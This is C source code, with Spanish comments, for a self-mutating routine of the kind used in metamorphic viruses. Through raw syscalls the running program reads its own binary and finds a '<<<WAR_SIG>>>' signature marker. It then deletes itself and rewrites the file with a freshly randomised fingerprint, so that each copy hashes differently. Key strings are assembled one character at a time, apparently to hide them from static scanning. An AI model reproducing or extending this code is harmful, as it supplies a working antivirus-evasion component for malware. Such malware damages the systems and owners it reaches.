#include <stddef.h>
#include <sys/types.h>

// ==================== SYSCALLS ====================

static inline long sys_write(int fd, const void *buf, size_t count) {
    long ret;
    __asm__ volatile(
        "mov $1, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(fd), "S"(buf), "d"(count)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_open(const char *path, int flags, int mode) {
    long ret;
    __asm__ volatile(
        "mov $2, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(path), "S"(flags), "d"(mode)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_close(int fd) {
    long ret;
    __asm__ volatile(
        "mov $3, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(fd)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_fstat(int fd, void *st) {
    long ret;
    __asm__ volatile(
        "mov $5, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(fd), "S"(st)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline void *sys_mmap(void *addr, size_t len, int prot, int flags, int fd, long offset) {
    void *ret;
    register long r10 __asm__("r10") = flags;
    register long r8 __asm__("r8") = fd;
    register long r9 __asm__("r9") = offset;
    
    __asm__ volatile(
        "mov $9, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(addr), "S"(len), "d"(prot), "r"(r10), "r"(r8), "r"(r9)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_munmap(void *addr, size_t len) {
    long ret;
    __asm__ volatile(
        "mov $11, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(addr), "S"(len)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_readlink(const char *path, char *buf, size_t bufsiz) {
    long ret;
    __asm__ volatile(
        "mov $89, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(path), "S"(buf), "d"(bufsiz)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_unlink(const char *path) {
    long ret;
    __asm__ volatile(
        "mov $87, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(path)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_clock_gettime(int clk_id, void *tp) {
    long ret;
    __asm__ volatile(
        "mov $228, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(clk_id), "S"(tp)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline int sys_getpid(void) {
    int ret;
    __asm__ volatile(
        "mov $39, %%rax\n"
        "syscall"
        : "=a"(ret)
        :
        : "rcx", "r11", "memory"
    );
    return ret;
}

// ==================== UTILIDADES ====================

__attribute__((section(".metamorph"), noinline, used))
static void *_memmem(const void *haystack, size_t hlen, const void *needle, size_t nlen) {
    if (nlen == 0) return (void *)haystack;
    if (hlen < nlen) return 0;
    
    const unsigned char *h = haystack;
    const unsigned char *n = needle;
    
    for (size_t i = 0; i <= hlen - nlen; i++) {
        size_t j;
        for (j = 0; j < nlen; j++) {
            if (h[i + j] != n[j])
                break;
        }
        if (j == nlen)
            return (void *)(h + i);
    }
    return 0;
}

__attribute__((section(".metamorph"), noinline, used))
static void _itohex(unsigned long val, char *buf, int len) {
    for (int i = len - 1; i >= 0; i--) {
        int nibble = val & 0xF;
        if (nibble < 10)
            buf[i] = '0' + nibble;
        else
            buf[i] = 'a' + (nibble - 10);
        val >>= 4;
    }
}

// ==================== FUNCIÓN PRINCIPAL ====================

__attribute__((section(".metamorph"), used))
void metamorph_mutate_self(void) {
    char exe_path[256];
    
    // 1. Construir "/proc/self/exe"
    char proc_self[16];
    proc_self[0] = '/'; proc_self[1] = 'p'; proc_self[2] = 'r';
    proc_self[3] = 'o'; proc_self[4] = 'c'; proc_self[5] = '/';
    proc_self[6] = 's'; proc_self[7] = 'e'; proc_self[8] = 'l';
    proc_self[9] = 'f'; proc_self[10] = '/'; proc_self[11] = 'e';
    proc_self[12] = 'x'; proc_self[13] = 'e'; proc_self[14] = '\0';
    
    // 2. Obtener path del ejecutable
    long path_len = sys_readlink(proc_self, exe_path, 255);
    if (path_len < 0)
        return;
    exe_path[path_len] = '\0';
    
    // 3. Abrir SOLO LECTURA (O_RDONLY = 0)
    int fd = sys_open(exe_path, 0, 0);
    if (fd < 0)
        return;
    
    // 4. Obtener tamaño (alineado a 8 bytes)
    long stat_buf[18];
    if (sys_fstat(fd, stat_buf) < 0) {
        sys_close(fd);
        return;
    }
    long file_size = stat_buf[6];
    
    // 5. Mapear en memoria PRIVADA (PROT_READ=1, MAP_PRIVATE=2)
    void *map = sys_mmap(0, file_size, 1, 2, fd, 0);
    sys_close(fd);
    if (map == (void *)-1 || map == 0)
        return;
    
    // 6. Buscar "<<<WAR_SIG>>>"
    char marker[14];
    marker[0] = '<'; marker[1] = '<'; marker[2] = '<';
    marker[3] = 'W'; marker[4] = 'A'; marker[5] = 'R';
    marker[6] = '_'; marker[7] = 'S'; marker[8] = 'I';
    marker[9] = 'G'; marker[10] = '>'; marker[11] = '>';
    marker[12] = '>'; marker[13] = '\0';
    
    char *sig_ptr = _memmem(map, file_size, marker, 13);
    if (!sig_ptr) {
        sys_munmap(map, file_size);
        return;
    }
    
    // 7. Buscar el '[' del fingerprint
    long fp_offset = 0;
    for (int i = 13; i < 80; i++) {
        if (sig_ptr[i] == '[' && sig_ptr[i + 9] == ']') {
            fp_offset = (sig_ptr + i + 1) - (char *)map;
            break;
        }
    }
    
    if (!fp_offset) {
        sys_munmap(map, file_size);
        return;
    }
    
    // 8. Generar nuevo fingerprint aleatorio
    long ts[2];
    sys_clock_gettime(0, ts);
    int pid = sys_getpid();
    
    unsigned long seed = ts[1] ^ ((unsigned long)pid << 16) ^ ts[0];
    seed = (seed << 13) | (seed >> 19);
    seed ^= 0xDEADBEEF;
    
    char new_fp[8];
    _itohex(seed, new_fp, 8);
    
    // 9. Borrar el archivo original (Linux permite esto si está en ejecución)
    sys_unlink(exe_path);
    
    // 10. Crear nuevo archivo (O_WRONLY|O_CREAT|O_TRUNC = 577, mode 0755)
    int fd_out = sys_open(exe_path, 577, 0755);
    if (fd_out < 0) {
        sys_munmap(map, file_size);
        return;
    }
    
    // 11. Escribir: antes del fingerprint + nuevo fingerprint + después
    sys_write(fd_out, map, fp_offset);
    sys_write(fd_out, new_fp, 8);
    sys_write(fd_out, (char *)map + fp_offset + 8, file_size - fp_offset - 8);
    
    // 12. Cleanup
    sys_close(fd_out);
    sys_munmap(map, file_size);
}
